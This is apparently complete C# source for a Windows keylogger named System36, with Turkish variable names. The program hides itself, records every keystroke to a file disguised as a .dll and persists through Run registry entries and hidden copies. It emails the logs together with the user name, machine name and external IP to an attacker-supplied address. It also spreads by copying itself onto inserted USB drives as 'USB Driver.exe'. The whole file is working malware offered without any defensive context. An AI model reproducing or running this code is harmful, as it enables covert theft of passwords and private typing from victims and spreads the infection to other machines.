using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Net.Mail;
using System.Net;
using System.Media;

namespace System36
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();    
        }

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        StringBuilder keyBuffer;

        private void button1_Click(object sender, EventArgs e)
        {
            Hide();
        }

        bool gonderme_basarili = true;
        int sinir = 60000;
        bool kapan = false;

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                if (Application.ExecutablePath == @"C:\System\System36.exe")
                {
                    if (Directory.Exists(@"C:\Users\" + System.Environment.UserName + "\\System Equipment") != true || File.Exists(@"C:\Users\" + System.Environment.UserName + "\\System Equipment\\Control36.exe") != true)
                    {
                        Directory.CreateDirectory(@"C:\Users\" + System.Environment.UserName + "\\System Equipment");

                        string path = Application.ExecutablePath;
                        string path1 = @"C:\Users\" + System.Environment.UserName + "\\System Equipment\\Control36.exe";
                        System.IO.File.Copy(path, path1, true);
                    }
                }
                else
                {
                    if (File.Exists(@"C:\System\System36.exe"))
                    {
                        kapan = true;
                        this.Close();
                    }
                    else
                    {
                        kontrol_et();
                        sahte_dosya();
                        string path = Application.ExecutablePath;
                        string path1 = @"C:\System\System36.exe";
                        System.IO.File.Copy(path, path1, true);

                        System.Diagnostics.Process.Start(@"C:\System\System36.exe");

                        kapan = true;
                        this.Close();
                    }
                }
            }
            catch (Exception)
            {
                
            }            

            dosya_var_mi();
            keyBuffer = new StringBuilder();
            timer1.Enabled = true;
        }

        void kontrol_et()
        {
            dosya_var_mi();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.Hide();         
            FileInfo info = new FileInfo(@"C:\System\LogFile.dll");

            if (info.Length >= sinir)
            {
                timer1.Enabled = false;
                mail_gonder();
                goto son;
            }
                foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        keyBuffer.Append(Enum.GetName(typeof(Keys), i));

                        try
                        {
                            StreamWriter sw = new StreamWriter(@"C:\System\LogFile.dll", true);
                                
                            switch (Convert.ToString(keyBuffer))
                            {
                                case "OemPipe": sw.Write("Ç"); break;
                                case "Oem2": sw.Write("Ö"); break;
                                case "Oem4": sw.Write("Ğ"); break;
                                case "Oem6": sw.Write("Ü"); break;
                                case "OemSemicolon": sw.Write("Ş"); break;
                                case "OemQuotes": sw.Write("İ"); break;
                                case "Oem8": sw.Write("*"); break;
                                case "Oem102": sw.Write("<"); break;

                                case "Enter": sw.WriteLine(" [ENTER]\n "); break;
                                case "Space": sw.Write(" "); break;
                                case "Back": sw.Write(" (B) "); break;

                                case "NumPad0": sw.Write("0"); break;
                                case "NumPad1": sw.Write("1"); break;
                                case "NumPad2": sw.Write("2"); break;
                                case "NumPad3": sw.Write("3"); break;
                                case "NumPad4": sw.Write("4"); break;
                                case "NumPad5": sw.Write("5"); break;
                                case "NumPad6": sw.Write("6"); break;
                                case "NumPad7": sw.Write("7"); break;
                                case "NumPad8": sw.Write("8"); break;
                                case "NumPad9": sw.Write("9"); break;

                                case "D0": sw.Write("0"); break;
                                case "D1": sw.Write("1"); break;
                                case "D2": sw.Write("2"); break;
                                case "D3": sw.Write("3"); break;
                                case "D4": sw.Write("4"); break;
                                case "D5": sw.Write("5"); break;
                                case "D6": sw.Write("6"); break;
                                case "D7": sw.Write("7"); break;
                                case "D8": sw.Write("8"); break;
                                case "D9": sw.Write("9"); break;

                                case "F1": sw.Write(" (F1) "); break;
                                case "F2": sw.Write(" (F2) "); break;
                                case "F3": sw.Write(" (F3) "); break;
                                case "F4": sw.Write(" (F4) "); break;
                                case "F5": sw.Write(" (F5) "); break;
                                case "F6": sw.Write(" (F6) "); break;
                                case "F7": sw.Write(" (F7) "); break;
                                case "F8": sw.Write(" (F8) "); break;
                                case "F9": sw.Write(" (F9) "); break;
                                case "F10": sw.Write(" (F10) "); break;
                                case "F11": sw.Write(" (F11) "); break;
                                case "F12": sw.Write(" (F12) "); break;

                                case "ShiftKey": sw.Write(" (SHFT) "); break;
                                case "LShiftKey":/*  sw.Write(" (LSHFT) "); */ break;
                                case "RShiftKey":/*  sw.Write(" (RSHFT) "); */ break;

                                case "ControlKey": /*  sw.Write(" (CTRL) "); */ break;
                                case "LControlKey": sw.Write(" (CTRL) "); break;
                                case "RControlKey": sw.Write(" (CTRL) "); break;

                                case "Menu": sw.Write(" (Alt) "); break;
                                case "LMenu": /*  sw.Write("SoAlt) "); */ break;
                                case "RMenu": /*  sw.Write("SaAlt) "); */ break;

                                case "CapsLock": sw.Write(" (CpsLck) "); break;
                                case "NumLock": sw.Write(" (NmLck) "); break;

                                case "LWin": sw.Write(" (Win) "); break;

                                case "Add": sw.Write("+"); break;
                                case "Subtract": sw.Write("-"); break;
                                case "Divide": sw.Write("/"); break;
                                case "Multiply": sw.Write("*"); break;
                                case "Decimal": sw.Write(","); break;
                                case "End": sw.Write(" (End) "); break;
                                case "PageDown": sw.Write(" (PD) "); break;
                                case "Prior": sw.Write(" (PU) "); break;
                                case "Home": sw.Write(" (Hm) "); break;
                                case "Delete": sw.Write(" (Del) "); break;
                                case "PrintScreen": sw.Write(" (PrntScrn) "); break;
                                case "Insert": sw.Write(" (Insrt) "); break;

                                case "LButton": /* sw.Write(" (ML) "); */ break;
                                case "RButton": /* sw.Write(" (MR) "); */ break;
                                case "MButton": /* sw.Write(" (MO) "); */ break;
                                case "XButton1": /* sw.Write(" (X1) "); */ break;
                                case "XButton2": /* sw.Write(" (X2) "); */ break;


                                case "OemMinus": sw.Write("-"); break;
                                case "OemPeriod": sw.Write("."); break;
                                case "Oemcomma": sw.Write(","); break;

                                case "Right": sw.Write(" (SaO) "); break;
                                case "Left": sw.Write(" (SoO) "); break;
                                case "Up": sw.Write(" (YuO) "); break;
                                case "Down": sw.Write(" (AşO) "); break;

                                case "VolumeDown": sw.Write(" (SSk) "); break;
                                case "VolumeUp": sw.Write(" (SSa) "); break;
                                case "VolumeMute": sw.Write(" (SesK) "); break;

                                case "Oemtilde": sw.Write("\""); break;
                                case "Tab": sw.Write(" (Tab) "); break;
                                case "Escape": sw.Write(" [Esc] "); break;


                                default: sw.Write(keyBuffer.ToString());
                                    break;
                            }

                            sw.Close();
                        }
                        catch
                        {

                        }

                        keyBuffer.Clear();
                    }
                
            }
            son: ;
        }

        void dosya_var_mi()
        {
            this.Refresh();

            if (Directory.Exists(@"C:\System") != true || File.Exists(@"C:\System\System36.exe") != true)
            {                
                Directory.CreateDirectory(@"C:\System");
                TextWriter dosya = new StreamWriter(@"C:\System\LogFile.dll");
                Directory.CreateDirectory(@"C:\Users\" + System.Environment.UserName + "\\System Equipment");

                sahte_dosya();

                string path = Application.ExecutablePath;
                string path1 = @"C:\System\System36.exe";
                System.IO.File.Copy(path, path1, true);

                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("System36", "C:\\System\\System36.exe");

                try
                {
                    string path2 = Application.ExecutablePath;
                    string path3 = @"C:\Users\" + System.Environment.UserName + @"\System Equipment\Control36.exe";
                    System.IO.File.Copy(path2, path3, true);
                }
                catch (Exception)
                {
                   
                }
                try
                {
                    RegistryKey key0  = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key0.SetValue("Control36", @"C:\Users\" + System.Environment.UserName + "\\System Equipment\\Control36.exe");
                }
                catch (Exception)
                {
                    
                }                
            }            
        }

        void sahte_dosya()
        {
            try
            {   pictureBox2.Image.Save(@"C:\System\System.png");
                pictureBox3.Image.Save(@"C:\System\Setup.png");
                pictureBox4.Image.Save(@"C:\System\Folder.png");
            }
            catch (Exception)
            {                
                
            }

            try
            {
                Directory.CreateDirectory(@"C:\System\System Equipment");
                Directory.CreateDirectory(@"C:\System\Comp");
                Directory.CreateDirectory(@"C:\System\WinEx");
                Directory.CreateDirectory(@"C:\System\Prosses");
                Directory.CreateDirectory(@"C:\System\Systems");

                TextWriter dosya0 = new StreamWriter(@"C:\System\EquipmentFile.dll");
                TextWriter dosya1 = new StreamWriter(@"C:\System\SystemFile.dll");
                TextWriter dosya2 = new StreamWriter(@"C:\System\ProssesFile.dll");

                dosya0.WriteLine("<?xml version=\"A.cb\" encoding=\"URE-4\" \nstandalone=\"yes\"?>\n<assembly>\\n<assemblyIdentity version=\"A.H.1.0.5.0\" name=\"DocWinApp.app\"/>\n<trustInfo xmlns=\"urn:schemas/microsoft/com:asm.v02\">\n<security>\n<reques xmlns=\"urn:schemas/microsoft-com/asm.v03\">\n<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n</requestedPrivileges>\n</security>\n</Info>\n</assembly>\"");
                dosya0.WriteLine("xmlns=\"urn;schemas/microsoft-com/asm.v01\" manifestVersion=\"D.0\"");
                dosya0.WriteLine("<assemblyIdentity version=\"A.H.1.0.m.0\" name=\"DocWinApp.app\"/>\n<trustInfo xmlns=\"urn:schemas/microsoft/com:asm.v02\">\n<security>\n<reques xmlns=\"urn:schemas/microsoft-com/asm.v03\">\n<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n</requestedPrivileges>\n</security>\n</Info>\n</assembly>");
                dosya0.Close();
                dosya1.WriteLine("<?xml =\"A.cb\" encoding=\"URE-4\" lone=\"yes\"?>\n<assembly xmlns=\"urn;schemas/microsoft-com/asm.v01\" manifestVersion=\"D.0\">\n<assemblyIdentity version=\"A.H.1.0.5.0\" name=\"DocWinApp.app\"/>\n<trustInfo xmlns=\"urn:schemas/microsoft/com:asm.v02\">\n<security>\n<requestPrivileg xmlns=\"urn:schemas/microsoft-com/asm.v03\">\n<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n</requestedPrivileges>\n</security>\n</trust>\n</assembly>\"");
                dosya1.WriteLine("\n<?xml version=\"A.cb\" encoding=\"URE-4\" standalone=\"yes\"?>\n<assembly xmlns=\"urn;schemas/microsoft-com/asm.v01\" manifest=\"D.0\">\n<Identity version=\"A.H.1.0.5.0\" name=\"DocWinApp.app\"/>\n<trustInfo xmlns=\"urn:schemas/microsoft/com:asm.v02\">\n<security>\n<requestedPrivileges xmlns=\"urn:schemas/microsoft-com/asm.v03\">\n<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n</requestedPrivileges>\n</security>\n</trustInfo>\n</assembly>\"");
                dosya1.Close();
                dosya2.WriteLine("<?xmlFile version=\"A.cb\" encoding=\"URE-4\" standalone=\"no\"?>\n \n <assembly xmlns=\"urn;\" manifestVersion=\"D.0\">\n<assemblyIdentity version=\"A.H.1.0.5.0\" name=\"DocWinApp.app\"/>\n<trustInfo xmlns=\"urn:schemas/microsoft/com:asm.v02\">\n<security>\n<Privileges xmlns=\"urn:schemas/microsoft-com/asm.v03\">\n<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n</requestedPrivileges>\n</security>\n</trustInfo>\n</assembly>\"");
                dosya2.Close();
            }
            catch (Exception)
            {
                
            }     
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (kapan == false)
            {
                e.Cancel = true;
                this.Hide();
            }
        }

        void mail_gonder()
        {
            string bil_ad = "";
            string kul_ad = "";
            string ip = "";
            string Konu = "";

            SmtpClient sc = new SmtpClient();
            sc.Port = 587;
            sc.Host = "smtp.live.com";
            sc.EnableSsl = true;
            sc.Credentials = new NetworkCredential("LOGLARI GÖNDERECEK MAİL ADRESİ", "LOGLARI GÖNDERECEK MAİL ADRESİNİN ŞİFRESİ");

            MailMessage mail = new MailMessage();
            mail.From = new MailAddress("LOGLARI GÖNDERECEK MAİL ADRESİ", "System36");
            mail.To.Add("LOGLARIN GİDECEĞİ MAİL ADRESİ");

            try
            {
                kul_ad = "[ " + System.Environment.UserName + " ]";
            }
            catch (Exception)
            {
                kul_ad = "[ Kul. Adı. Alınamadı ]";
            }

            try
            {
                bil_ad = "[ " + System.Environment.MachineName + " ]";
            }
            catch (Exception)
            {
                bil_ad = "[ Bil. Adı. Alınamadı ]";
            }

            try
            {
                string externalIP;
                externalIP = (new System.Net.WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new System.Text.RegularExpressions.Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();
                ip = "[ " + externalIP + " ]";
            }
            catch (Exception)
            {
                ip = "[ Ip Alınamadı ]";
            }

            Konu = kul_ad + "-" + bil_ad + "-" + ip;

            mail.Subject = Konu;
            mail.IsBodyHtml = true;

            try
            {
                mail.Body = DateTime.Now.ToString();
            }
            catch (Exception)
            {
                mail.Body = " [ Tarih Alınamadı ]";
            }

            try
            {
                mail.Attachments.Add(new Attachment(@"C:\System\LogFile.dll"));
            }
            catch (Exception)
            {
                mail.Body = mail.Body + "-[ Dosya Yüklenemedi ]";
            }

            try
            {
                sc.Send(mail);
                gonderme_basarili = true;
            }
            catch (Exception)
            {
                gonderme_basarili = false;
            }

            mail.Dispose();
            sc.Dispose();
            timer2.Enabled = true;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (gonderme_basarili == true)
            {
                StreamWriter dosya = new StreamWriter(@"C:\System\LogFile.dll");
                dosya.WriteLine("[ Son Başarılı Dosya Gönderme Tarihi: " + DateTime.Now.ToString() + " ]");
                dosya.Close();
                sinir = 60000;
            }
            else
            {
                sinir = sinir + 60000;
            }

            timer1.Enabled = true;
            timer2.Enabled = false;
        }
        
        bool src_takildi = false;

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x219)
            {
                DriveInfo[] suruculer = DriveInfo.GetDrives();

                foreach (DriveInfo surucu in suruculer)
                {
                    System.Threading.Thread.Sleep(200);
                    if (surucu.IsReady)
                    {
                        if (surucu.VolumeLabel != "OS" && src_takildi == false)
                        {
                            src_takildi = true;
                            timer3.Enabled = true;
                            
                            try
                            {
                                string path0 = Application.ExecutablePath;
                                string path1 = surucu.Name + "\\USB Driver.exe";
                                System.IO.File.Copy(path0, path1, true);
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }
                }
            }
            base.WndProc(ref m);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            src_takildi = false;
        }
         }
}